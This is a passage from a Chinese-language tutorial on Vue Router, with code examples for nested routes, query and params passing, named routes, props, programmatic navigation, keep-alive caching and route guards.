]<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="2-router的使用"><a href="#2-router的使用" class="headerlink" title="2.router的使用"></a>2.router的使用</h3><p>我们准备两个组件Home和About，展示的内容便是需要切换的部分</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;template&gt;</span><br>  <span class="hljs-params">&lt;div&gt;</span><br>    <span class="hljs-params">&lt;h2&gt;</span>我是About的内容<span class="hljs-params">&lt;/h2&gt;</span><span class="hljs-comment">//Home中就是 我是Home中的内容</span><br>  <span class="hljs-params">&lt;/div&gt;</span><br><span class="hljs-params">&lt;/template&gt;</span><br></code></pre></td></tr></table></figure><p>然后回到app组件，我们介绍路由对应的两个新标签</p><p>1.当我们需要切换页面时，按照以往的操作，应该配置一个<code>a</code>标签，而在路由中我们使用<code>router-link</code>和<code>to</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 现在我们使用router-link 和 to 实现路由的切换--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;list-group-item&quot;</span> <span class="hljs-attr">active-class</span>=<span class="hljs-string">&quot;active&quot;</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;about&quot;</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 由路由实现高亮active效果 active-class --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;list-group-item&quot;</span> <span class="hljs-attr">active-class</span>=<span class="hljs-string">&quot;active&quot;</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;home&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.我们需要展示的内容就使用<code>router-view</code> 替代占位</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel-body&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 展示组件看用户的导航项 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>OK！基本效果完成</p><h3 id="3-几个注意点"><a href="#3-几个注意点" class="headerlink" title="3.几个注意点"></a>3.几个注意点</h3><p>1.路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹</p><p>2.通过切换，隐藏了的路由组件，默认是被销毁（destroy）的，需要的时候再去挂载。</p><p>3.每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</p><p>4.整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到</p><h2 id="3-嵌套（多级）路由"><a href="#3-嵌套（多级）路由" class="headerlink" title="3.嵌套（多级）路由"></a>3.嵌套（多级）路由</h2><p>但是我们在工程中的时候，常常是一个组件切换后还有一个组件切换——所以我们拥有了多级路由</p><p>有什么不一样？</p><p>多级路由无非就是一个路径的问题，例如我们这里home下还有一个路由</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">&#123;</span><br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/home&#x27;,</span><br>    <span class="hljs-attr">component</span>: <span class="hljs-string">Home,</span><br>    <span class="hljs-attr">children</span>: <span class="hljs-string">[//配置children属性，实现多级路由</span><br>        <span class="hljs-attr">&#123;</span><br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;news&#x27;,</span><br>            <span class="hljs-attr">component</span>: <span class="hljs-string">News,</span><br>        <span class="hljs-attr">&#125;,</span><br>        <span class="hljs-attr">&#123;</span><br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;message&#x27;,</span><br>            <span class="hljs-attr">component</span>: <span class="hljs-string">Message,</span><br>        <span class="hljs-attr">&#125;</span><br>    <span class="hljs-attr">]</span><br><span class="hljs-attr">&#125;</span><br></code></pre></td></tr></table></figure><p>然后就是home下<code>router-link</code>的路径——也需要写出完整路径</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//home 组件中写入</span><br>&lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav nav-tabs&quot;</span>&gt;<br>   &lt;<span class="hljs-keyword">li</span>&gt;<br>     &lt;router-link <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list-group-item&quot;</span> active-<span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;active&quot;</span> to=<span class="hljs-string">&quot;/home/news&quot;</span>&gt;<span class="hljs-keyword">News</span>&lt;/router-link&gt;<br>   &lt;/<span class="hljs-keyword">li</span>&gt;<br>   &lt;<span class="hljs-keyword">li</span>&gt;<br>     &lt;router-link <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;list-group-item&quot;</span> active-<span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;active&quot;</span> to=<span class="hljs-string">&quot;/home/message&quot;</span>&gt;Message&lt;/router-link&gt;<br>   &lt;/<span class="hljs-keyword">li</span>&gt;<br> &lt;/ul&gt;<br></code></pre></td></tr></table></figure><p>最后在需要展示的位置<code>router-view</code>就好了！</p><h2 id="4-路由的query参数"><a href="#4-路由的query参数" class="headerlink" title="4.路由的query参数"></a>4.路由的query参数</h2><p>我们的父路由也可以给子路由传递参数，达到影响子路由数据的效果。而我们传递参数所使用的便是<strong>query参数</strong></p><p>query参数的位置和我们ajax发送请求加参数的位置一样：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">      <span class="hljs-comment">&lt;!-- :to后面解析为js语句，使用了es6模板语法 ``直接传递字符串，$</span></span><span class="hljs-template-variable">&#123;&#125;</span><span class="xml"><span class="hljs-comment">传递表达式--字符串写法--&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;m in messageList&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;m.id&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">:to</span>=<span class="hljs-string">&quot;`/home/message/detail?id=$</span></span></span><span class="hljs-template-variable">&#123;m.id&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&amp;title=$</span></span></span><span class="hljs-template-variable">&#123;m.title&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">`&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;m.title&#125;</span><span class="xml">&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>但是这样子写参数多了会不美观，所以我们写成对象：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-comment">&lt;!-- 推荐-对象写法 --&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;m in messageList&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;m.id&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span></span></span><br><span class="hljs-tag"><span class="xml">    <span class="hljs-attr">:to</span>=<span class="hljs-string">&quot;&#123;</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="xml">      path: &#x27;/home/message/detail&#x27;,</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="xml">      query: &#123; id: m.id, title: m.title &#125;,</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="xml">    &#125;&quot;</span></span></span><br><span class="hljs-tag"><span class="xml">    &gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">m.title</span> &#125;&#125;</span><span class="xml">&lt;/router-link</span><br><span class="xml">  &gt;<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>将:to中的内容写成对象，数据展示更加直观</p><p>第二个问题：子路由如何收集这些数据呢？</p><p>我们先来查看我们传递了参数之后的<code>$route</code>：<img src="https://s2.loli.net/2022/06/20/Mf14mLnbv9lD8Ez.png" alt="query后的route.png"></p><p>新增了query属性，query属性里面就是我们传递的数据！</p><p>那我们直接使用它：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>消息编号：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$route.query.id</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>消息标题：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$route.query.title</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>这样数据传输就大功告成了</p><h2 id="5-路由的命名"><a href="#5-路由的命名" class="headerlink" title="5.路由的命名"></a>5.路由的命名</h2><p>大家有没有觉得，当我们的路由嵌套变多，路径越写越长十分麻烦</p><p>那么现在，我们就使用名字来表示一个路由：添加<code>name</code>参数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">children: [<br>    &#123;<br>        <span class="hljs-type">name</span>: <span class="hljs-string">&#x27;xiaodi&#x27;</span>,<br>        <span class="hljs-type">path</span>: <span class="hljs-string">&#x27;detail&#x27;</span>,<br>        component: Detail,<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><p>但是我们的name参数在使用时，需要将to写成对象形式</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;m in messageList&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;m.id&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span></span></span><br><span class="hljs-tag"><span class="xml">    <span class="hljs-attr">:to</span>=<span class="hljs-string">&quot;</span></span></span><span class="xquery">&#123;</span><br><span class="xquery">      //<span class="hljs-built_in"> path</span>: <span class="hljs-string">&#x27;/home/message/detail&#x27;</span>,</span><br><span class="xquery">     <span class="hljs-built_in"> name</span> : <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,//不用写冗长的路径名</span><br><span class="xquery">      query: &#123;<span class="hljs-built_in"> id</span>: m<span class="hljs-built_in">.id</span>, title: m.title &#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">,</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="xml">    &#125;&quot;</span></span></span><br><span class="hljs-tag"><span class="xml">    &gt;</span></span><span class="xquery">&#123;&#123; m.title &#125;</span><span class="xml">&#125;&lt;/router-link</span><br><span class="xml">  &gt;<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>十分好用</p><h2 id="6-params参数"><a href="#6-params参数" class="headerlink" title="6.params参数"></a>6.params参数</h2><p>我们也可以使用params参数传递参数</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&lt;li v-<span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;m in messageList&quot;</span> <span class="hljs-symbol">:key=<span class="hljs-string">&quot;m.id&quot;</span>&gt;&lt;router-link</span> <span class="hljs-symbol">:to=<span class="hljs-string">&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;</span>&gt;</span>&#123;&#123;m.title&#125;&#125;&lt;<span class="hljs-regexp">/router-link&gt;&lt;/li</span>&gt;<br><span class="hljs-regexp">//</span>后两个代表参数<br></code></pre></td></tr></table></figure><p>或者对象写法</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;m in messageList&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;m.id&quot;</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span></span></span><br><span class="hljs-tag"><span class="xml">    <span class="hljs-attr">:to</span>=<span class="hljs-string">&quot;</span></span></span><span class="xquery">&#123;</span><br><span class="xquery">      //<span class="hljs-built_in"> path</span>: <span class="hljs-string">&#x27;/home/message/detail&#x27;</span>,</span><br><span class="xquery">     <span class="hljs-built_in"> name</span> : <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,//不用写冗长的路径名</span><br><span class="xquery">      params: &#123;<span class="hljs-built_in"> id</span>: m<span class="hljs-built_in">.id</span>, title: m.title &#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">,</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="xml">    &#125;&quot;</span></span></span><br><span class="hljs-tag"><span class="xml">    &gt;</span></span><span class="xquery">&#123;&#123; m.title &#125;</span><span class="xml">&#125;&lt;/router-link</span><br><span class="xml">  &gt;<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>需要注意的是，在对象写法中params不能和path一起搭配使用</p><p>然后我们需要在路由中修改path：添加占位符区分路径和参数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xl">children: [<br>    &#123;<br>        <span class="hljs-keyword">name</span>: <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,<br>        <span class="hljs-built_in">path</span>: <span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>,<span class="hljs-comment">//使用占位符接收params参数</span><br>        component: Detail,<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><p>读取数据的时候使用<code>$route.params.xxx</code>就可以了</p><h2 id="7-props参数"><a href="#7-props参数" class="headerlink" title="7.props参数"></a>7.props参数</h2><p>但是当我们传递的参数过多的时候，每一个参数前加上<code>$route.params.xxx</code>十分不方便，那么我们可以使用props参数</p><p>props写法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">name: <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,<br>path: <span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>,<span class="hljs-regexp">//</span>使用占位符接收params参数<br>component: Detail,<br><span class="hljs-regexp">//</span>第一种写法，对象写法-一般不使用<br><span class="hljs-regexp">//</span> props:&#123;id:<span class="hljs-string">&#x27;001&#x27;</span>,title:<span class="hljs-string">&#x27;hello&#x27;</span>&#125;<br><span class="hljs-regexp">//</span>第二种写法，布尔值写法，将params参数转换为props传给detail<br><span class="hljs-regexp">//</span> props:true<br><span class="hljs-regexp">//</span>第三种写法，函数写法，顾及到了query参数<br>props(<span class="hljs-variable">$route</span>) &#123;<br>    return &#123; id: <span class="hljs-variable">$route</span>.query.id, title: <span class="hljs-variable">$route</span>.query.title &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后在detail组件中申明接收：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">props: [&quot;id&quot;, &quot;title&quot;],</span><br><span class="xml">//正常使用</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>消息编号：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">id</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>消息标题：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">title</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="8-replace模式"><a href="#8-replace模式" class="headerlink" title="8.replace模式"></a>8.replace模式</h2><p>1.作用：控制路由跳转时操作浏览器历史记录的模式</p><p>2.浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></p><p>3.如何开启<code>replace</code>模式：<code>&lt;router-link replace :to=&quot;</code>/home/message/detail/${m.id}/${m.title}<code>&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</code></p><h2 id="9-编程式路由跳转"><a href="#9-编程式路由跳转" class="headerlink" title="9.编程式路由跳转"></a>9.编程式路由跳转</h2><p>不借助<code>router-link</code>实现路由跳转</p><p>我们通过<code>$router</code>中的方法实现路由的跳转</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pushShow</span><span class="hljs-params">(m)</span></span>&#123;<br>  this.<span class="hljs-variable">$router</span><span class="hljs-selector-class">.push</span>(&#123;<span class="hljs-comment">//内部和router-link，to的内部一样</span><br>      name : <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,<span class="hljs-comment">//不用写冗长的路径名</span><br>      query: &#123; id: m<span class="hljs-selector-class">.id</span>, title: m<span class="hljs-selector-class">.title</span> &#125;,<br>  &#125;)<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">replaceShow</span><span class="hljs-params">(m)</span></span>&#123;<br>    this.<span class="hljs-variable">$router</span><span class="hljs-selector-class">.replace</span>(&#123;<br>      name : <span class="hljs-string">&#x27;xiaoxi&#x27;</span>,<span class="hljs-comment">//不用写冗长的路径名</span><br>      query: &#123; id: m<span class="hljs-selector-class">.id</span>, title: m<span class="hljs-selector-class">.title</span> &#125;,<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>同样可以是实现路由的前进和后退</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">back</span><span class="hljs-params">()</span></span>&#123;<br>  this.<span class="hljs-variable">$router</span><span class="hljs-selector-class">.back</span>()<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">forward</span><span class="hljs-params">()</span></span>&#123;<br>  this.<span class="hljs-variable">$router</span><span class="hljs-selector-class">.forward</span>()<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">go</span><span class="hljs-params">()</span></span>&#123;<br>  this.<span class="hljs-variable">$router</span><span class="hljs-selector-class">.go</span>(+<span class="hljs-number">2</span>)<span class="hljs-comment">//代表前进两次，-2代表后退两次</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-缓存路由组件"><a href="#10-缓存路由组件" class="headerlink" title="10.缓存路由组件"></a>10.缓存路由组件</h2><p>让不展示的路由组件保持挂载，不被销毁</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">keep</span>-alive <span class="hljs-keyword">include</span>=<span class="hljs-string">&quot;News&quot;</span>&gt;<br>  &lt;router-<span class="hljs-keyword">view</span>&gt;&lt;/router-<span class="hljs-keyword">view</span>&gt;<br>&lt;/<span class="hljs-keyword">keep</span>-alive&gt;<br></code></pre></td></tr></table></figure><p> 如果不写include属性，则是默认缓存所有在这里展示的组件，include中填写的是<strong>组件名</strong></p><p>或者写成数组</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:include=</span>[<span class="hljs-string">&#x27;News&#x27;</span>,<span class="hljs-string">&#x27;Message&#x27;</span>]<br></code></pre></td></tr></table></figure><h2 id="11-生命周期钩子"><a href="#11-生命周期钩子" class="headerlink" title="11.生命周期钩子"></a>11.生命周期钩子</h2><p>路由组件的两个独有的生命周期钩子，用于捕获路由组件的激活状态</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">activated</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;News组件被激活了&#x27;</span>);<br>&#125;,<br><span class="hljs-function"><span class="hljs-title">deactivated</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;News组件失活了&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12-路由守卫"><a href="#12-路由守卫" class="headerlink" title="12.路由守卫"></a>12.路由守卫</h2><p>为了保护我们的路由安全而设置</p><h3 id="1-前置路由守卫"><a href="#1-前置路由守卫" class="headerlink" title="1.前置路由守卫"></a>1.前置路由守卫</h3><p>在初始化和路由切换的时候执行一个函数（注意这里先用route去接VueRouter,在最后才暴露）</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autoit">router.beforeEach((<span class="hljs-keyword">to</span>, from, <span class="hljs-keyword">next</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">to</span>.fullPath === <span class="hljs-string">&#x27;/home/news&#x27;</span> || <span class="hljs-keyword">to</span>.fullPath === <span class="hljs-string">&#x27;/home/message&#x27;</span>) &#123;//去这两个路由加判断<br>        console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">to</span>,from)<span class="hljs-comment">;</span><br>        <span class="hljs-keyword">if</span> (localStorage.getItem(<span class="hljs-string">&#x27;school&#x27;</span>)===<span class="hljs-string">&#x27;swpu&#x27;</span>)&#123;<br>            <span class="hljs-keyword">next</span>()<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            alert(<span class="hljs-string">&#x27;权限不够&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">next</span>()<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>如上面代码所示，我们在这个函数中可以拿到三个参数，next是用于跳转的，to和from如下图</p><p><img src="https://s2.loli.net/2022/06/20/qKtY8lSCFvjfz4V.png" alt="从home跳转到xxx.png"></p><p>其中有各种各样的属性，我们可以读取属性如：path，name，进行判断</p><h3 id="2-后置路由守卫"><a href="#2-后置路由守卫" class="headerlink" title="2.后置路由守卫"></a>2.后置路由守卫</h3><p>补充：meta（路由元信息）-在路由元信息中加入isAuth参数</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">path: &#x27;<span class="hljs-keyword">news</span>&#x27;,<br>component: <span class="hljs-keyword">News</span>,<br><span class="hljs-keyword">meta</span>:&#123;isAuth:true&#125;<span class="hljs-comment">//权限校验配置</span><br></code></pre></td></tr></table></figure><p>可以简化我们路由的判断</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">to</span>.meta.isAuth) &#123;<span class="hljs-comment">//去这两个路由加判断</span><br>    console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>后置路由守卫，顾名思义，就是在跳转之后执行的函数–<code>afterEach</code></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-regexp">//</span>后置路由守卫<br>router.afterEach(<span class="hljs-function"><span class="hljs-params">(to,<span class="hljs-keyword">from</span>)</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">document</span>.title = to.meta.title || <span class="hljs-string">&#x27;欢迎&#x27;</span><br>&#125;)<br><br></code></pre></td></tr></table></figure><p>里面进行我们跳转之后为网页标签的一个修改</p><h3 id="3-独享路由守卫"><a href="#3-独享路由守卫" class="headerlink" title="3.独享路由守卫"></a>3.独享路由守卫</h3><p>独享路由守卫写在我们路由的配置项当中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">path: <span class="hljs-string">&#x27;news&#x27;</span>,<br><span class="hljs-attr">component</span>: News,<br><span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;新闻&#x27;</span>&#125;,<span class="hljs-comment">//权限校验配置</span><br><span class="hljs-comment">//独享路由守卫</span><br><span 